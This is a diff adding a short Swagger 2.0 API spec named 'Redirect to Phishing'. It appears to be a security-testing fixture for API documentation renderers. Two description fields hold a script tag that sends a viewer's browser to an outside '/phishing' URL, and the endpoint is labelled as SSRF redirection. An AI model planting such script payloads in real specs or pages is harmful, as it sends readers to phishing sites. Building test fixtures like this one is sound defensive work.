@@ -1,0 +1,27 @@
+swagger: '2.0'
+info:
+  title: Redirect to Phishing
+  description: |
+    <script>window.location.href='https://sekeratest.free.beeceptor.com/phishing';</script>
+
+  version: vulnerable
+basePath: /maliciousEndpoint/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
+paths:
+  /ssrf-redirect:
+    get:
+      responses:
+        '200':
+          description: |
+            <script>window.location.href='https://sekeratest.free.beeceptor.com/phishing';</script>
+      tags:
+        - ssrf
+      operationId: redirectSSRF
+      summary: SSRF redirection to phishing page
